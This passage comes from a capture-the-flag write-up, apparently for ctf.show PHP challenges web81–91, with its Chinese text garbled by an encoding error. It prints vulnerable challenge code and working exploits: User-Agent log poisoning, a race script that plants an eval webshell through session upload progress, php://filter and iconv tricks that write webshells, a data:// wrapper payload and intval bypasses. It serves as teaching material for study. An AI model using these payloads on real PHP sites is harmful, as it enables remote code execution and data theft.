title="web81"></a>web81</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤šç¦ç”¨äº†<code>:</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=/var/log/nginx/access.log</span><br><span class="line">User-Agent:&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br><span class="line"># fl0g.php index.php</span><br><span class="line"></span><br><span class="line">/?file=/var/log/nginx/access.log</span><br><span class="line">User-Agent:&lt;?php system(&#x27;cat fl0g.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure><h2 id="web82-86"><a href="#web82-86" class="headerlink" title="web82-86"></a>web82-86</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç«äº‰ï¼Œå‚è€ƒ<a href="https://blog.csdn.net/miuzzx/article/details/116205407?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167163920016800184196214%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=167163920016800184196214&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-116205407-null-null.article_score_rank_blog&utm_term=%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&spm=1018.2226.3001.4450">yu22x</a>å¸ˆå‚…è„šæœ¬å³å¯</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">session=requests.<span class="title function_ invoke__">session</span>()</span><br><span class="line">sess=<span class="string">&#x27;evo1&#x27;</span></span><br><span class="line">url1=<span class="string">&quot;http://17b55daa-9b61-4a00-8424-5a0fe3c2c471.challenge.ctf.show/&quot;</span></span><br><span class="line">url2=<span class="string">&#x27;http://17b55daa-9b61-4a00-8424-5a0fe3c2c471.challenge.ctf.show/?file=/tmp/sess_&#x27;</span> + sess</span><br><span class="line">data1=&#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data2=&#123;</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;system(&quot;cat f*&quot;);&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file=&#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;abc&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies=&#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line">def <span class="title function_ invoke__">write</span>():</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        r = session.<span class="title function_ invoke__">post</span>(url1,data=data1,files=file,cookies=cookies)</span><br><span class="line">def <span class="title function_ invoke__">read</span>():</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        r = session.<span class="title function_ invoke__">post</span>(url2,data=data2)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#123;&#x27;</span> in r.text:</span><br><span class="line">            <span class="keyword">print</span>(r.text)</span><br><span class="line">threads = [threading.<span class="title function_ invoke__">Thread</span>(target=write),</span><br><span class="line">       threading.<span class="title function_ invoke__">Thread</span>(target=read)]</span><br><span class="line"><span class="keyword">for</span> t in threads:</span><br><span class="line">    t.<span class="title function_ invoke__">start</span>()</span><br></pre></td></tr></table></figure><h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;å¤§ä½¬åˆ«ç§€äº†&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨base64çš„æ–¹å¼å†™å…¥æ–‡ä»¶å†è¿›è¡Œdecodeã€‚base64ç¼–ç åªåŒ…å«64ä¸ªå¯æ‰“å°å­—ç¬¦ï¼Œè€Œphpè§£ç base64æ—¶é‡åˆ°ä¸åœ¨å…¶ä¸­çš„å­—ç¬¦ï¼Œä¼šå¿½ç•¥æ‰ï¼Œå°†åˆæ³•å­—ç¬¦è¿›è¡Œç»„åˆå˜æˆä¸€ä¸ªå­—ç¬¦ä¸²è¿›è¡Œè§£ç ï¼Œæ‰€ä»¥<code>&lt;?php die(&#39;å¤§ä½¬åˆ«ç§€äº†&#39;);?&gt;</code>å¯¹å…¶è§£ç åï¼Œåªæœ‰<code>phpdie</code>å…­ä¸ªå­—ç¬¦ç»„æˆå­—ç¬¦ä¸²è¿›è¡Œè§£ç (è¡¥2ä¸ª<code>a</code>å‡‘é½8å­—èŠ‚)ã€‚</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0307586d-c3c7-43a3-b6a3-d7c3ff5ed904.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>54</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://0307586d-c3c7-43a3-b6a3-d7c3ff5ed904.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>_ga=GA1.2.1002087790.1668386541</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">content</span><span class="operator">=</span>aaPD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKTs/Pg<span class="operator">=</span><span class="operator">=</span></span></span><br></pre></td></tr></table></figure><p>ç„¶åè®¿é—®<code>1.php</code>å³å¯</p><h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”¨<code>data</code>åè®®çš„<code>base64</code>ç¼–ç ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKTsgPz4</span><br></pre></td></tr></table></figure><h3 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h3><p>ç›´æ¥åŒ…å«æ–‡ä»¶</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?file=/var/www/html/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>e0f908bb-f5ab-4fb9-b93b-0b4ee4b943e6.challenge.ctf.show</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://e0f908bb-f5ab-4fb9-b93b-0b4ee4b943e6.challenge.ctf.show/index.php?file=/var/www/html/index.php</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>_ga=GA1.2.1002087790.1668386541</span><br><span class="line"><span class="attribute">Range</span><span class="punctuation">: </span>bytes=0-</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>è·å¾—æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]:<span class="string">&quot;5.mp4&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: video/mp4&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Length: <span class="subst">$file</span>&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥åŒ…å«<code>flag.php</code>å³å¯</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?file=/var/www/html/flag.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>e0f908bb-f5ab-4fb9-b93b-0b4ee4b943e6.challenge.ctf.show</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://e0f908bb-f5ab-4fb9-b93b-0b4ee4b943e6.challenge.ctf.show/index.php?file=/var/www/html/index.php</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>_ga=GA1.2.1002087790.1668386541</span><br><span class="line"><span class="attribute">Range</span><span class="punctuation">: </span>bytes=0-</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><h3 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$contents</span>);</span><br></pre></td></tr></table></figure><p>è½¬æ¢ç¼–ç æ–¹å¼å³å¯</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>, <span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ç»è¿‡ä¸€æ¬¡åè½¬:&quot;</span>.<span class="variable">$result</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ç»è¿‡ç¬¬äºŒæ¬¡åè½¬:&quot;</span>.<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>, <span class="variable">$result</span>);</span><br><span class="line"><span class="comment">/*ç»è¿‡ä¸€æ¬¡åè½¬:?&lt;hp pvela$(P_SO[T]1;)&gt;?</span></span><br><span class="line"><span class="comment">ç»è¿‡ç¬¬äºŒæ¬¡åè½¬:&lt;?php eval($_POST[1]);?&gt;*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>contents</code>ä¸­å­—ç¬¦ä¸¤ä¸¤äº¤æ¢</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>b2fc01e7-e346-44ec-b5ca-e43faf2c7002.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>33</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">contents</span>=?&lt;hp pvela$(P_SO[T]<span class="number">1</span><span class="comment">;)&gt;?</span></span></span><br></pre></td></tr></table></figure><p>ç„¶åè®¿é—®<code>a.php</code>å¹¶<code>POST:1=system(&#39;tac flag.php&#39;);</code>å³å¯</p><h2 id="phpç‰¹æ€§"><a href="#phpç‰¹æ€§" class="headerlink" title="phpç‰¹æ€§"></a>phpç‰¹æ€§</h2><h3 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•°ç»„ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?num[]=1</span><br></pre></td></tr></table></figure><blockquote><p>intval() ä¸èƒ½ç”¨äº objectï¼Œå¦åˆ™ä¼šäº§ç”Ÿ E_NOTICE é”™è¯¯å¹¶è¿”å› 1</p></blockquote><h3 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•°å­—å­—æ¯æ··åˆæˆ–è€…16è¿›åˆ¶éƒ½å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?num=4476a</span><br><span class="line">/?num=0x117c</span><br></pre></td></tr></table></figure><blockquote><p><strong>intval()</strong> å‡½æ•°ç”¨äºè·å–å˜é‡çš„æ•´æ•°å€¼ã€‚</p><p><strong>intval()</strong> å‡½æ•°é€šè¿‡ä½¿ç”¨æŒ‡å®šçš„è¿›åˆ¶ base è½¬æ¢ï¼ˆé»˜è®¤æ˜¯åè¿›åˆ¶ï¼‰ï¼Œè¿”å›å˜é‡ var çš„ integer æ•°å€¼ã€‚ intval() ä¸èƒ½ç”¨äº objectï¼Œå¦åˆ™ä¼šäº§ç”Ÿ E_NOTICE é”™è¯¯å¹¶è¿”å› 1ã€‚</p><p>PHP 4, PHP 5, PHP 7</p><h3 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int intval ( mixed $var [, int $base = 10 ] )</span><br></pre></td></tr></table></figure><p>å‚æ•°è¯´æ˜ï¼š</p><ul><li>$varï¼šè¦è½¬æ¢æˆ integer çš„æ•°é‡å€¼ã€‚</li><li>$baseï¼šè½¬åŒ–æ‰€ä½¿ç”¨çš„è¿›åˆ¶ã€‚</li></ul><p>å¦‚æœ base æ˜¯ 0ï¼Œé€šè¿‡æ£€æµ‹ var çš„æ ¼å¼æ¥å†³å®šä½¿ç”¨çš„è¿›åˆ¶ï¼š</p><ul><li>å¦‚æœå­—ç¬¦ä¸²åŒ…æ‹¬äº† â€œ0xâ€ (æˆ– â€œ0Xâ€) çš„å‰ç¼€ï¼Œä½¿ç”¨ 16 è¿›åˆ¶ (hex)ï¼›å¦åˆ™ï¼Œ</li><li>å¦‚æœå­—ç¬¦ä¸²ä»¥ â€œ0â€ å¼€å§‹ï¼Œä½¿ç”¨ 8 è¿›åˆ¶(octal)ï¼›å¦åˆ™ï¼Œ</li><li>å°†ä½¿ç”¨ 10 è¿›åˆ¶ (decimal)ã€‚</li></ul><h3 id="è¿”å›å€¼"><a href="#è¿”å›å€¼" class="headerlink" title="è¿”å›å€¼"></a>è¿”å›å€¼</h3><p>æˆåŠŸæ—¶è¿”å› var çš„ integer å€¼ï¼Œå¤±è´¥æ—¶è¿”å› 0ã€‚ ç©ºçš„ array è¿”å› 0ï¼Œéç©ºçš„ array è¿”å› 1ã€‚</p><p>æœ€å¤§çš„å€¼å–å†³äºæ“ä½œç³»ç»Ÿã€‚ 32 ä½ç³»ç»Ÿæœ€å¤§å¸¦ç¬¦å·çš„ integer èŒƒå›´æ˜¯ -2147483648 åˆ° 2147483647ã€‚ä¸¾ä¾‹ï¼Œåœ¨è¿™æ ·çš„ç³»ç»Ÿä¸Šï¼Œ intval(â€˜1000000000000â€™) ä¼šè¿”å› 2147483647ã€‚64 ä½ç³»ç»Ÿä¸Šï¼Œæœ€å¤§å¸¦ç¬¦å·çš„ integer å€¼æ˜¯ 9223372036854775807ã€‚</p><p>å­—ç¬¦ä¸²æœ‰å¯èƒ½è¿”å› 0ï¼Œè™½ç„¶å–å†³äºå­—ç¬¦ä¸²æœ€å·¦ä¾§çš„å­—ç¬¦ã€‚</p></blockquote><h3 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>&#x2F;iè¡¨ç¤ºåŒ¹é…å¤§å°å†™<br>å­—ç¬¦ ^ å’Œ $ 